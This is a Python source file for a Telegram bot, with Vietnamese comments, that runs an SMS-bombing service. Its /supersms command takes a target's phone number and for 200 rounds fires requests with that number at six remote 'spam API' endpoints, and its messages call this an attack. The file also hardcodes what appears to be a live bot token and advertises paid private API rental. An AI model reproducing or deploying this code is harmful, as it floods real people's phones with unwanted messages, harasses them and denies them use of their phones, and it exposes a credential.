import telebot
import requests
from telebot import types
from keep_alive import keep_alive
import threading
import asyncio
import aiohttp
import time
bot = telebot.TeleBot("6763265749:AAHI3h3TvkXzeDlGLFBKTI3zY1vae1u7Keg")
# Chat_id của nhóm mà bạn muốn bot hoạt động
allowed_chat_id = -1001854558437
print("Bot Đã Được Khởi Chạy")

is_spamming = {}

async def spam(phone, user_name, message):
    # Lấy chat_id của nhóm mà tin nhắn được gửi đến
    chat_id = message.chat.id
    
    # Kiểm tra nếu chat_id của nhóm trùng khớp với chat_id của nhóm được chỉ định
    if chat_id != allowed_chat_id:
        bot.send_message(chat_id, "Xin lỗi, tôi chỉ hoạt động trên nhóm được chỉ định.")
        return
        
    count = 200 # Số lần spam
    is_spamming[phone] = True
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(count):
            # Kiểm tra xem số điện thoại đã bị dừng spam chưa
            if phone in is_spamming and not is_spamming[phone]:
                break
            
            # Tạo một task mới để gửi yêu cầu GET đến trang web spam
            task = asyncio.ensure_future(session.get(f"https://mongdh.lqkmod.repl.co?phone={phone}"))
            tasks.append(task)
            
            task2 = asyncio.ensure_future(session.get(f"https://apibykhanglee.lqkmod.repl.co?phone={phone}"))
            tasks.append(task2)
            
            task3 = asyncio.ensure_future(session.get(f"https://khanglee2017.lqkmod.repl.co?phone={phone}"))
            tasks.append(task3)
    
            
            task4 = asyncio.ensure_future(session.get(f"https://duma.lqkmod.repl.co?phone={phone}"))
            tasks.append(task4)
                   
            task5 = asyncio.ensure_future(session.get(f"https://khangdeptrai.lqkmod.repl.co?phone={phone}"))
            tasks.append(task5)
        
            task6 = asyncio.ensure_future(session.get(f"https://liajsi.lqkmod.repl.co?phone={phone}"))

            tasks.append(task6)
      
            # Delay 1 giây trước khi spam tiếp
            await asyncio.sleep(1)
            
        # Chạy tất cả các task đồng thời
        await asyncio.gather(*tasks)
        
    is_spamming[phone] = False
    bot.send_message(chat_id, f"🤖 Hoàn Tất Tấn Công 🤖 {count} lần cho số điện thoại {phone} từ {user_name}.")

last_command_time = 0

@bot.message_handler(commands=['supersms'])
def start_spam(message):
    global last_command_time
    phone = message.text.split()[1]
    
    user_name = message.from_user.first_name
    if message.from_user.last_name:
        user_name += f" {message.from_user.last_name}"
    
    chat_id = message.chat.id
    
    if chat_id != allowed_chat_id:
        bot.send_message(chat_id, "Xin lỗi, tôi chỉ hoạt động trên nhóm được chỉ định.")
        return
    
    current_time = time.time()
    if current_time - last_command_time < 10:
        bot.send_message(chat_id, f"Xin lỗi, bạn phải đợi {10 - int(current_time - last_command_time)} giây trước khi sử dụng lệnh tiếp theo.")
        return
    else:
        last_command_time = current_time
    
    count = 200
    bot.send_message(chat_id, "🚀 Successfully submit an attack request 🚀\nBot 👾: @khangleeapi_bot\nSố tấn công 📱:  {}\nNgười yêu cầu: {}\nLập lại ⚔️: [ {} ]\nPlan 💸:  [ VIP ]\nThời gian chờ ⏱️: [ 60s ]\nChủ sở hữu 👑: Khang Lee".format(phone, user_name, count))
    
    t = threading.Thread(target=asyncio.run, args=(spam(phone, user_name, message),))
    t.start()

@bot.message_handler(commands=['how'])
def send_welcome(message):
    # Lấy chat_id của nhóm mà tin nhắn được gửi đến
    chat_id = message.chat.id
    
    # Kiểm tra nếu chat_id của nhóm trùng khớp với chat_id của nhóm được chỉ định
    if chat_id == allowed_chat_id:
        global last_command_time
        current_time = time.time()
        if message.text.startswith('/supersms') and current_time - last_command_time < 60:
            bot.send_message(chat_id, f"Xin lỗi, bạn phải đợi {60 - int(current_time - last_command_time)} giây trước khi sử dụng lệnh tiếp theo.")
            return
        else:
            last_command_time = current_time
        bot.send_message(chat_id, "Để Sử Dụng Bot Vui Lòng Ghi!\n/supersms điền số điện thoại bạn cần 𝗧𝗮̂́𝗻 𝗰𝗼̂𝗻𝗴 ⚔️\n/dung điền số điện thoại để dừng tấn công\n ae có nhu cầu thuê api riêng ib @Humphrey_Lee nhé")
    else:
        bot.send_message(chat_id, "Xin lỗi, tôi chỉ hoạt động trên nhóm được chỉ định.")

@bot.message_handler(commands=['dung'])
def stop_spam(message):
    phone = message.text.split()[1]
    if phone in is_spamming:
        is_spamming[phone] = False
        bot.send_message(message.chat.id, f"Đã Dừng Chạy Spam:{phone}.")
    else:
        bot.send_message(message.chat.id, f"Số điện thoại {phone} không đang được spam.")

keep_alive()
bot.polling()